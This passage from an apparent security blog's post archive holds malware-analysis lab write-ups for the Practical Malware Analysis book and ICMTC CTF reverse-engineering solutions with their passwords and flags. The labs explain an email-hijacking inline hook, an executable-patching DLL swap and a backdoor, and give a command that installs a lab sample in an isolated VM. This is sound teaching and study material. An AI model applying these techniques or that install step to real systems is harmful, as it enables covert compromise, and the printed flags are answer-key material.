src=\"/assets/images/Tutorials-Labs/PMAch11/sub_100012A3.png\" alt=\"alt text\"></p>\n<p>At the beginning of the <code>sub_10001203</code>, the malware calculates the difference between the memory address of the <code>send</code> function and the start of <code>sub_1000113D</code>. This difference has an additional 5 bytes subtracted from it before being moved into var_4 which will be insrted to the start of the <code>send</code> function. </p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/sub_10001203.png\" alt=\"alt text\"></p>\n<p>Next, the malware call <code>VirtualProtect</code> to change the memory protection enabling execution, then calla <code>malloc</code> to allocates 0xFF bytes of memory (256 bytes in decimal) then stores the handle to the newly allocated memory\nin <code>var_8</code>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/sub_10001203-1.png\" alt=\"alt text\"></p>\n<p>After that, a call to <code>memcpy</code> is called to copy the first 5 bytes from the <code>send</code> function into the <code>var_8</code>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/sub_10001203-3.png\" alt=\"alt text\"></p>\n<p>Then, the malware modifies the first 5 bytes from the <code>send</code> function so that the code jumps to the <code>sub_1000113D</code> then jump back to <code>send</code> everytime <code>send</code> is being called.</p>\n<p>This technique is know as an <strong>inline hook</strong> which means that the malware overwrites the API function code contained in the imported DLLs.  </p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/sub_10001203-4.png\" alt=\"alt text\"></p>\n<p>The malware will recall the <code>VirtualProtect</code> API to restore the original memory-protection settings.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/sub_10001203-5.png\" alt=\"alt text\"></p>\n<p>This technique is know as an <strong>inline hook</strong> which means that the malware overwrites the API function code contained in the imported DLLs.  </p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q6:</strong></span>\nWhat does the hooking code do?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Short Answer:</strong></span></p>\n<p>The malware add a recipient to all outgoing email messages if the <code>RCPT TO:</code> was found.</p>\n<p><span style=\"color:#00FFFF;\"><strong>Detailed Answer :</strong></span></p>\n<p>Going back to the <code>sub_1000113D</code>, the malware searchs for the string <code>RCPT TO:</code> in the <strong>Str</strong> argument , if it&#39;s not found, it will call <code>dword_10003484</code> which will executes the original <code>send</code> API.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/sub_1000113D.png\" alt=\"alt text\"></p>\n<p>If the string <code>RCPT TO:</code> is found, the malware will concatenate the following strings together <strong>RCPT TO:</strong> &lt; + <strong>byte_100034A0** + **&gt;\\r\\n</strong> to become <code>RCPT TO: &lt;byte_100034A0&gt;\\r\\n</code>, the <code>dword_10003484</code> was holding the read bytes from the <code>Lab11-02.ini</code>then passed as an argument to <code>sub_100010B3</code> to be decoded which we can assume will be an email address.</p>\n<p>Then the malware calls  <code>dword_10003484</code>  twice, which will add a recipient to all outgoing email messages.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/sub_1000113D-1.png\" alt=\"alt text\"></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q7:</strong></span>\nWhich process(es) does this malware attack and why?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Short Answer:</strong></span></p>\n<p>Based on our analysis for <code>sub_100014B6</code>, this malware only attacks the following processes:</p>\n<ul>\n<li>MSIMN.exe</li>\n<li>THEBAT.exe</li>\n<li>OUTLOOK.exe</li>\n</ul>\n<p>This is because they are specific email clients and this malware is designed to hook a specific API call (<code>send</code> API) only for the specified email clients.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q8:</strong></span>\nWhat is the significance of the .ini file?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Short Answer:</strong></span></p>\n<p>The .ini file contains an encoded email address. After decoding Lab11-02.ini, we see that it contains <code>billy@malwareanalysisbook.com</code>. </p>\n<p><span style=\"color:#00FFFF;\"><strong>Detailed Answer :</strong></span></p>\n<p>To determine what actually is the significance of the .ini file, I went back to the <strong>DllMain</strong> function, I used x64dbg and start executing the whole function, first the <code>CreateFileA</code> will fail to open the .ini file due to code signing requirements.</p>\n<p>We can assume that this malware was craft for a windows xp or older machines when code signing requirements wasn&#39;t introduced yet.</p>\n<p>However, we know that if the opening process was successful the malware will read about 255 byte from the .ini file then pass the to <code>sub_100010B3</code> to be decoded.</p>\n<p>I used <code>HxD</code> hex editor to copy the bytes inside the .ini file then I patched them manually at the <code>byte_100034A0</code> which is the passed parameter to <code>sub_100010B3</code></p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/HxD.png\" alt=\"alt text\"><br><img src=\"/assets/images/Tutorials-Labs/PMAch11/Dump.png\" alt=\"alt text\"></p>\n<p>After that, I put a breakpoint just after the call to <code>sub_100010B3</code>  to see the return value which will contain the decoded string from the .ini file, as we expected in Q6 it is an eamil address for <code>billy@malwareanalysisbook.com</code></p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/decoder2.png\" alt=\"alt text\"><br><img src=\"/assets/images/Tutorials-Labs/PMAch11/Email.png\" alt=\"alt text\"></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q9:</strong></span>\nHow can you dynamically capture this malware’s activity with Wireshark?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Short Answer:</strong></span></p>\n<ol>\n<li>Install the malware.</li>\n<li>Setup an instance of <code>wireshark</code>.</li>\n<li>Use the <code>Outlook Express</code> client, <code>msimn.exe</code> to send an email.</li>\n</ol>\n<p><span style=\"color:#00FFFF;\"><strong>Detailed Answer :</strong></span></p>\n<ul>\n<li><p>First, We need to isolate the VM from access the outside world,  we do that by setting up the network adapter to host-only, then begin capturing packets on this adapter in Wireshark.</p>\n</li>\n<li><p>Next, we run the <code>installer</code> function like we did before.</p>\n<pre><code class=\"language-sh\">rundll32.exe Lab11-02.dll , installer\n</code></pre>\n</li>\n<li><p>Then, we set up Outlook Express to send email to the host system, and we  setup a fake smtp daemon debugging server to receive emails on our host OS. </p>\n<pre><code class=\"language-sh\">python -m smtpd -n -c DebuggingServer 192.168.56.1:25\n</code></pre>\n</li>\n<li><p>Now, we can send an email from Outlook Express.</p>\n</li>\n<li><p>Going back to wireshark, we can see the modification of recipients has alredy happened and it is now also includes <code>billy@malwareanalysisbook.com</code>.</p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch11/wireshark.jpg\" alt=\"alt text\"></p>\n</li>\n</ul>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#00FFFF;\">THE END</span></p>\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/icmct-finals",
    "slug": "icmct-finals",
    "title": "ICMTC CTF Finals 2024",
    "description": "A Write-Up for two of the ICMTC CTF Finals Reverse Engineering challenges ",
    "date": "July 28, 2024",
    "readTime": "3 min read",
    "tags": [
      "CTF"
    ],
    "category": "CTF Writeups",
    "imageUrl": "/assets/images/reverse-engineering/ICMTC_finals/running1.png",
    "content": "<h1><strong>ICMTC CTF Finals 2024</strong></h1>\n<h2><strong>OperationQak</strong></h2>\n<h3><strong>General information:</strong></h3>\n<blockquote>\n<p>Type :  EXE<br>CPU :  64-bit<br>Subsystem :  Console<br>Packing :   NO<br>MD5 Hash : 046A587250419523A20DB0464ACFC702</p>\n</blockquote>\n<h3><strong>Running the binary:</strong></h3>\n<p>First, Let&#39;s run the program:</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC_finals/running1.png\" alt=\"Running the binary\"></p>\n<p>So, it&#39;s a straight forward binary, we just need to find the correct secret key.</p>\n<h3><strong>Analysis:</strong></h3>\n<p>Now, let&#39;s open our binary in IDA, we see our previous printed strings followed by a call to <code>sub_140001350</code> which is a scan function to get our input, after that another call to <code>sub_140001000</code> happened then a call to <code>strcmp</code> to compare between our input and the return value of <code>sub_140001000</code>.</p>\n<p>If the comparison was successful, our flag will be printed, otherwise the string <strong>&quot;Authentication FAILED!&quot;</strong> will be printed.</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC_finals/main1.png\" alt=\"main function\"></p>\n<p>To get the right input, I used x64dbg and set a BP on the call to <code>strcmp</code> to see its arguments and that&#39;s what I got.</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC_finals/strcmp.png\" alt=\"strcmp arguments\"></p>\n<p>So, let&#39;s try <code>operation_duck_hunt</code> as our input, and VOILA! </p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC_finals/Flag.png\" alt=\"Flag\"></p>\n<h3><strong>Flag:</strong></h3>\n<p><span style=\"color:#00FFFF;\"><strong>EGCERT{1850093_operation_duck_hunt}</strong></span></p>\n<p><em>Note: the number at beginning of the flag is just the output of <code>GetTickCount</code> API call which Retrieves the number of milliseconds that have elapsed since the system was started, this number will change every time we run the binary.</em></p>\n<hr>\n<hr>\n<h2><strong>SimpleObfuscator</strong></h2>\n<h3><strong>General information:</strong></h3>\n<blockquote>\n<p>Type :  EXE<br>CPU :  32-bit<br>Subsystem :  Console<br>Packing :   NO<br>MD5 Hash: 8B057322913A0BF9A313E30FA55CBD82<br>Signature: Microsoft Visual C# v7.0 / Basic .NET</p>\n</blockquote>\n<h3><strong>Running the binary:</strong></h3>\n<p>First, Let&#39;s run the program:</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC_finals/running2.png\" alt=\"Running the binary\"></p>\n<p>Again, we need to find the correct password.</p>\n<h3><strong>Analysis:</strong></h3>\n<p>Now, let&#39;s open our .NET binary in dnSpy, from the first look, we can tell that this is an Obfuscated binary.</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC_finals/main2.png\" alt=\"obfuscateed main\"></p>\n<p>So, I used <code>de4dot</code> to deobfuscate the binary using the following command</p>\n<pre><code class=\"language-sh\"> de4dot -r &quot;C:\\Users\\husky\\Desktop\\New folder&quot; -ro deobfuscated\n</code></pre>\n<p>Now, we have a deobfuscated file that we can reverse easily.</p>\n<p>First, the main function is just calling <code>gj44ampptns</code> function.</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC_finals/main3.png\" alt=\"deobfuscated main\"></p>\n<p>Inside the <code>gj44ampptns</code> function we see some anti-debugging techniques, then an initialization for two string <code>b</code> and <code>arg</code>, then the line <strong>&quot;Enter Password: &quot;</strong>  will be printed.</p>\n<p>After that our input will be scaned and compared to the string <code>b</code>, if they are equal, our flag will be printed, otherwise the string <strong>&quot;Peace Out!&quot;</strong> will be printed.</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC_finals/gj44ampptns.png\" alt=\"gj44ampptns function\"></p>\n<p>Now, let&#39;s have a look on the <code>b</code> string, it contains the string <code>No_On3_Can_Find_My_S3cr37_Pass</code></p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC_finals/password.png\" alt=\"Password\"></p>\n<p>Now, let&#39;s try <code>No_On3_Can_Find_My_S3cr37_Pass</code> as our input, and again VOILA! </p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC_finals/Flag-2.png\" alt=\"Flag\"></p>\n<h3><strong>Flag:</strong></h3>\n<p><span style=\"color:#00FFFF;\"><strong>EGCERT{n00b_0bfuscat0r_taopetc3jcd}</strong></span></p>\n<p><em>Note: the string &quot;taopetc3jcd&quot; at the end of the flag is also random string generated from  the use of Program.cy5azpmunsa() as second argument to  string.Format() function, this string will change every time we run the binary.</em></p>\n<h3><strong>SAD NEWS:</strong></h3>\n<p>Unfortunately, When I finally got this flag and went to sumbit it, I found out the CTF has ended two minutes ago.</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC_finals/sad_man.jpeg\" alt=\"SAD MAN\"></p>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#00FFFF;\">THE END</span></p>\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/icmtc-outofsight",
    "slug": "icmtc-outofsight",
    "title": "Out of Sight ICMTC-2024",
    "description": "A Write-Up for ICMTC Reverse challenge Out of Sight",
    "date": "June 28, 2024",
    "readTime": "4 min read",
    "tags": [
      "CTF"
    ],
    "category": "CTF Writeups",
    "imageUrl": "/assets/images/reverse-engineering/ICMTC/runinng_the_program.png",
    "content": "<h1><strong>ICMTC CTF 2024</strong></h1>\n<h2><strong>Out of Sight</strong></h2>\n<h2>General information:</h2>\n<blockquote>\n<p>Type :  ELF<br>CPU :  64-bit<br>Subsystem :  Console<br>Packing :   NO</p>\n</blockquote>\n<h2>Running the binary:</h2>\n<p>First, Let&#39;s run the program:</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC/runinng_the_program.png\" alt=\"alt text\"></p>\n<h2>Static Analysis:</h2>\n<p>Now, let&#39;s go to our previous printed string <code>Enter The Vault Password Key:</code>, We can see a called to <code>sub_565FFA2C942D</code>  with our input as parameter which looks like encoding method, then a compare between 2 strings, if they are identical we get our flag, otherwise we get &quot;<em>Access Denied</em>&quot;</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC/Static-1.png\" alt=\"alt text\"></p>\n<p>Now, let&#39;s open a remote debugger in IDA to see what is happening.</p>\n<h2>Dynamic Analysis:</h2>\n<p>First, we should notice that there is an anti-debugging technique at the beginning, we could just patch this jump to force it to jump to our <code>loc_5D49C99119B5</code> always.</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC/anti-debugging.png\" alt=\"alt text\"></p>\n<p>Now we run our program and insert <code>input</code> as our input, we can see that the <code>_strcmp</code> is comparing our encoded input with <code>lvu_krr_uw_blhg</code>.</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC/hex_view.png\" alt=\"alt text\"></p>\n<p>Now let&#39;s have a look in how <code>sub_565FFA2C942D</code> encodes our input.</p>\n<p><strong>Encoding Process</strong>:</p>\n<ul>\n<li>Loop over each character in <code>a1</code> (which contains our input) up to <code>v14</code> length.</li>\n<li>If the character is alphabetical, it performs a shift:<ul>\n<li>If uppercase, it converts it to the range 0-25 (A-Z), applies the key shift, and converts back to uppercase.</li>\n<li>If lowercase, it does similarly but for the lowercase range (a-z).</li>\n</ul>\n</li>\n<li>Non-alphabetical characters are copied unchanged.</li>\n</ul>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC/Encoding.png\" alt=\"alt text\"></p>\n<p>After some deep analysis, we can tell that it uses <code>Vigenère cipher</code> to encode the input.</p>\n<p> <strong>Example for Vigenère cipher</strong>:</p>\n<ul>\n<li>Plaintext: &quot;HELLO&quot;</li>\n<li>Keyword: &quot;KEY&quot;</li>\n<li>Repeated Keyword: &quot;KEYKE&quot;</li>\n<li>encoding: <ul>\n<li>H + K -&gt; R (shift H by 10 places, K is the 11th letter)</li>\n<li>E + E -&gt; I (shift E by 4 places, E is the 5th letter)</li>\n<li>L + Y -&gt; J (shift L by 24 places, Y is the 25th letter)</li>\n<li>L + K -&gt; V (shift L by 10 places, K is the 11th letter)</li>\n<li>O + E -&gt; S (shift O by 4 places, E is the 5th letter)</li>\n</ul>\n</li>\n<li>Ciphertext: &quot;RIJVS&quot;</li>\n</ul>\n<p>Instead of trying to debug the whole encoding subroutines to get our key, I used a little tricky way to get our key.</p>\n<p>As mentioned, the <code>Vigenère cipher</code> use a Repetitive key to shift all of the characters in the plaintext, the alphabetical character values are between 0-25, typically if we use 0 as input (either <code>a</code> or <code>A</code>),Thus, the ciphertext character directly tells us the key character.</p>\n<p>So, I provided <code>aaaaaaaaaaaaaaaaaaaaaaaa</code> as input and I got <code>eh_frame_hdreh_frame_hdr</code> as encoded value in S2, so our Repetitive key is <code>eh_frame_hdr</code> but we know that Non-alphabetical characters aren&#39;t accepted in Vigenère cipher so it&#39;s a modifed version of it that <code>_</code> has a shift value.</p>\n<p>After some tries we can tell that if the third character in our input:</p>\n<ul>\n<li>is <code>v</code> will result in <code>t</code>.</li>\n<li>is <code>m</code> will result in <code>k</code>.</li>\n<li>is <code>r</code> will result in <code>p</code>.</li>\n</ul>\n<p>So the <code>_</code> does a shift left by 2 alphabetical characters which is the same effect of <code>y</code> in original Vigenère cipher (shift right by 24 alphabetical characters), that mean that our key could be representd as <code>ehyframeyhdr</code>.</p>\n<h2>Cyber Chief:</h2>\n<p>Now as we got our key and we know the ciphertext must equal <code>lvu_krr_uw_blhg</code>, we can use cyber chief decoder to get our input.</p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC/cyberchief.png\" alt=\"alt text\"></p>\n<p>Now let&#39;s try it </p>\n<p><img src=\"/assets/images/reverse-engineering/ICMTC/flagggggggg.png\" alt=\"alt text\"></p>\n<p><strong>Yup, we got our flag ;)</strong></p>\n<blockquote>\n<p>EGCERT{how_far_is_deep}</p>\n</blockquote>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#00FFFF;\">THE END</span></p>\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/pmach7",
    "slug": "pmach7",
    "title": "Chapter-7 PMA Write-up",
    "description": "A solution to chapter-7 lab from (Practical Malware Analysis) Book",
    "date": "April 30, 2024",
    "readTime": "8 min read",
    "tags": [
      "Malware"
    ],
    "category": "Tutorials & Labs",
    "imageUrl": "/assets/images/Tutorials-Labs/PMAch7/1-1-a.png",
    "content": "<h1><span style=\"color:#004F98;\"><strong>Lab 7-1 :</strong></span></h1>\n<p>Analyze the malware found in the file Lab07-01.exe.</p>\n<p><span style=\"color:#00FFFF;\"><strong>Q1:</strong></span>\n How does this program ensure that it continues running (achieves persistence) when the computer is restarted?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span>\nBy checking the main function using IDA-PRO, we see that a hint\nsays <code>MalService</code> then a call to <code>StartServiceCtrIDispatcherA</code> function.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch7/1-1-a.png\" alt=\"Alt text\"></p>\n<p>By getting into the <strong>sub_401040</strong> we see evidence of creating a service.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch7/1-1-b.png\" alt=\"Alt text\"></p>\n<p>According to the MSDN page the <code>StartServiceCtrIDispatcherA</code> actually connects the main thread of a service process to the service control manager, which causes the thread to be the service control dispatcher thread for the calling process, Now we know for sur it creates a service.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q2:</strong></span>\nWhy does this program use a mutex?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>We continue to see that it calls OpenMutexA to open a mutex called <code>HGL345</code> then tests the returning value.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch7/1-2.png\" alt=\"Alt text\"></p>\n<p>depending on the result of the test, the program will either terminate or jump to loc_401064 which will create a mutex under the name of <code>HGL345</code>.</p>\n<p>This technic is used to make sure that there is only one piece of the malware runing on the machine.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q3:</strong></span>\nWhat is a good host-based signature to use for detecting this program?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>The best way to detecte that malware is bt searching for a mutex named <code>HGL345</code> or a service named <code>MalService.</code></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q4:</strong></span>\nWhat is a good network-based signature for detecting this malware?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>Now we see that it uses the <code>user-agent Internet Explorer 8.0</code> to get access to the url <code>http://www.malwareanalysisbook.com</code> which represent a network-based indicator.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch7/1-4.png\" alt=\"Alt text\"></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q5:</strong></span>\nWhat is the purpose of this program?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>The purpose of this program could be obtained from the next:</p>\n<ul>\n<li><p>At loc_401064 we can see that the malware is setting a timer to <code>834h</code> which is <code>2100</code> in decimal.</p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch7/1-5-a.png\" alt=\"Alt text\"></p>\n</li>\n<li><p>Next malware is set to sleep untill the year of 2100 comes.</p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch7/1-5-b.png\" alt=\"Alt text\"></p>\n</li>\n<li><p>When that year comes, an infinte loop will start sending requests to the url <code>http://www.malwareanalysisbook.com</code> as a distributed denial-of-service (DDoS) attack.</p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch7/1-4.png\" alt=\"Alt text\"></p>\n</li>\n</ul>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q6:</strong></span>\nWhen will this program finish executing?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>This program will never terminate as it is uncodditional jump to an <strong>INFINITE LOOP</strong>.</p>\n<hr>\n<hr>\n<h1><span style=\"color:#004F98;\"><strong>Lab 7-2 :</strong></span></h1>\n<p>Analyze the malware found in the file Lab07-02.exe.</p>\n<p><span style=\"color:#00FFFF;\"><strong>Q1:</strong></span>\nHow does this program achieve persistence?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>While examining the program we found no evidence of achieving persistence, there is no creation for any scheduled tasks, services, startup files, or run keys.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q2:</strong></span>\nWhat is the purpose of this program?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<ul>\n<li><p>By diging into the program we can see a <code>OleInitialize</code> and <code>CoCreateInstance</code> functions which are used to initialize a COM object and set its defalut values to a specified CLSID.</p>\n</li>\n<li><p>Then, we see a call to &quot;VariantInit&quot; function to intialize a string to <code>http://www.malwareanalysisbook.com/ad.html</code>.</p>\n</li>\n<li><p>Then it excutes that string with the created COM object (likely Internet Explorer).</p>\n</li>\n<li><p>The program will free this string lately after excutes it.</p>\n</li>\n<li><p><strong>In total</strong>, this program is creating a COM object and uses it to open a URL that may be an advertisement as it ends with <code>ad.html</code> (We can make sure of that by running the program).</p>\n</li>\n</ul>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q3:</strong></span>\nWhen will this program finish executing?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>The program will finish excution whe the ad already appears.</p>\n<hr>\n<hr>\n<h1><span style=\"color:#004F98;\"><strong>Lab 7-3 :</strong></span></h1>\n<p><strong>For this lab</strong>, we obtained the malicious executable, Lab07-03.exe, and DLL, \nLab07-03.dll, prior to executing. This is important to note because the malware might change once it runs. Both files were found in the same directory on the victim machine. If you run the program, you should ensure that both files are in the same directory on the analysis machine. A visible IP string beginning with 127 (a loopback address) connects to the local machine. (In the real version of this malware, this address connects to a remote machine, but we&#39;ve set it to connect to localhost to protect you.)</p>\n<p><span style=\"color:#FF0000;\"><strong>WARNING</strong></span><br>This lab may cause considerable damage to your computer and may be difficult to remove once installed. Do not run this file without a virtual machine with a snapshot \ntaken prior to execution.\nThis lab may be a bit more challenging than previous ones. You&#39;ll need to use a combination of static and dynamic methods, and focus on the big picture in order to avoid getting bogged down by the details.</p>\n<p><span style=\"color:#00FFFF;\"><strong>Q1:</strong></span>\nHow does this program achieves persistence to ensure that it continues running when the computer is restarted?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>By looking to the program we can&#39;t see any obvious proof of persistance, but there is alot of suspicious things within the file  that could be described as next : </p>\n<ul>\n<li><p>First, we see a reference to the supplied DLL <code>Lab07-03.dll</code> and the windows DLL <code>Kernel32.dll</code>.</p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch7/3-1-a.png\" alt=\"Alt text\"></p>\n</li>\n<li><p>Second, we see reference to pushing a close-label but different dll under the name of <code>kerne132.dll.</code> and the supplied dll <code>Lab07-03.dll</code> onto path <code>C:\\\\windows\\\\system32</code></p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch7/3-1-b.png\" alt=\"Alt text\"></p>\n</li>\n<li><p>Then, we see a call to &quot;sub_4011E0&quot; which is doing a search for every file in the <code>C:\\\\*</code> directory.</p>\n<p> <img src=\"/assets/images/Tutorials-Labs/PMAch7/3-1-c.png\" alt=\"Alt text\"></p>\n</li>\n<li><p>Now we can see alot of chaos like jumps and comparisions, but that&#39;s not our concern right now.</p>\n</li>\n<li><p>By continue searching, we can see a comparison occurs that checks if a file is a .exe and if it is, it calls the &quot;sub_4010A0&quot;.</p>\n<p> <img src=\"/assets/images/Tutorials-Labs/PMAch7/3-1-d.png\" alt=\"Alt text\"></p>\n</li>\n<li><p>In &quot;sub_4010A0&quot; we see a call to 3 functions <strong><code>CreateFile</code>, <code>CreateFileMapping</code></strong>, and <strong><code>MapViewOfFile</code></strong>, these fuctions are typically used to map a file to memory and modify it.</p>\n<p> <img src=\"/assets/images/Tutorials-Labs/PMAch7/3-1-e.png\" alt=\"Alt text\"></p>\n</li>\n<li><p>After mapping the file into memory, we see a comparison between <code>kernel32</code> and a loction in the exe file, if it&#39;s found it copies a value referenced by &quot;dword_403010&quot; over the top of it.</p>\n<p> <img src=\"/assets/images/Tutorials-Labs/PMAch7/3-1-f.png\" alt=\"Alt text\"></p>\n</li>\n<li><p>the value stored in the &quot;dword_403010&quot; is <code>6E72656Bh</code>, by converting it to an ASCII string we see it&#39;s actual value.</p>\n<p> <img src=\"/assets/images/Tutorials-Labs/PMAch7/3-1-g.png\" alt=\"Alt text\"></p>\n</li>\n</ul>\n<p><span style=\"color:#00FFFF;\"><strong>In brief</strong></span>, this program searches for all .exe files within C Directory, when an exe is found, it loads it into memory and replace the kernel32.dll with kerne132.dll, this is the way it gains persistance.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q2:</strong></span>\nWhat are two good host-based signatures for this malware?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p>The best two host-base indecators are :</p>\n<ul>\n<li><p>The first is writing the DLL <code>kerne132.dll</code> to <code>C:\\Windows\\System32</code> and modifying every .exe file on the system to import that DLL instead of the original one <code>kernel32.dll</code> as we described previously.</p>\n<p>  (<em>Note, it uses number 1 instead of letter L</em>).</p>\n</li>\n<li><p>We can the second on inside the &quot;Lab07-03.dll&quot;, a creation of mutex under the name of <code>SADFHUHF</code>.</p>\n<p>  <img src=\"/assets/images/Tutorials-Labs/PMAch7/3-2.png\" alt=\"Alt text\"></p>\n</li>\n</ul>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q3:</strong></span>\nWhat is the purpose of this program?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<ul>\n<li><p>According to Q1, this is an advenced back-door that makes a remote access connection.</p>\n</li>\n<li><p>By analyzing Lab07-03.dll, we can see the connection is set with IP <strong>127.26.152.13</strong></p>\n</li>\n<li><p>the prgram has a lopp to choose between two cammands, either sleep or exectue.</p>\n</li>\n</ul>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q4:</strong></span>\nHow could you remove this malware once it is installed?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<ul>\n<li><p>To remove this malware you can write a script or a program to undo all changes to the executables.</p>\n</li>\n<li><p>Another handy and tricky way is to just delete the <code>kerne132,dll</code> and  rename the windows <code>kernel32.dll</code> to the deleted one.<br><span style=\"color:#FF0000;\"><strong>Be Carefule</strong></span> while doing that, because the system may crash during booting due to no variant of kernel32.dll being present.</p>\n</li>\n</ul>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#00FFFF;\">THE END</span></p>\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/pmach6",
    "slug": "pmach6",
    "title": "Chapter-6 PMA Write-up",
    "description": "A solution to chapter-5 lab from (Practical Malware Analysis) Book",
    "date": "April 26, 2024",
    "readTime": "9 min read",
    "tags": [
      "Malware"
    ],
    "category": "Tutorials & Labs",
    "imageUrl": "/assets/images/Tutorials-Labs/PMAch6/1-1.png",
    "content": "<h1><span style=\"color:#004F98;\"><strong>Introduction :</strong></span></h1>\n<p>The goal of the labs for this chapter is to help you to understand the overall functionality of a program by analyzing code constructs. Each lab will guide you through discovering and analyzing a new code construct. Each lab builds on the previous one, thus creating a single, complicated piece of malware with four constructs. Once you’ve finished working through the labs, you should be able to more easily recognize these individual constructs when you encounter them in malware..</p>\n<hr>\n<hr>\n<h1><span style=\"color:#004F98;\"><strong>Lab 6-1 :</strong></span></h1>\n<p><span style=\"color:#00FFFF;\"><strong>Q1 :</strong></span>\nWhat is the major code construct found in the only subroutine called by main?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<p> By looking to the graphic view we will see that there is comparison that decide which location to jump to, So typicallyit an <span style=\"color:#004F98;\"><strong>IF-Statement</strong></span> that decides if the internet is connected or not. </p>\n<p>   <img src=\"/assets/images/Tutorials-Labs/PMAch6/1-1.png\" alt=\"Alt text\"></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q2 :</strong></span>\n What is the subroutine located at 0x40105F?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer :</strong></span></p>\n<ul>\n<li><p>Before the function is called, we see some strings are pushed onto the stack, those strings are end with &quot;\\n&quot; a &quot;string buffer&quot;.</p>\n<p> <img src=\"/assets/images/Tutorials-Labs/PMAch6/1-2-a.png\" alt=\"Alt text\"></p>\n</li>\n<li><p>Next we see that &quot;sub_40105F&quot; is calling two function identified as &quot;__stubf&quot; and &quot;__ftbuf&quot;</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch6/1-2-b.png\" alt=\"Alt text\"></p>\n</li>\n<li><p>Typical to <a href=\"https://github.com/dotnet/coreclr/blob/master/src/pal/src/safecrt/internal.h#L274-L275\">The .NET Core, internal.h</a> &quot;__stbuf&quot; and &quot;__ftbuf&quot; are &quot;string buffer&quot; and &quot;format buffer&quot; in order which provides support for input/output of files.</p>\n</li>\n<li><p>Now we see that the &quot;sub_40105F&quot; is a <span 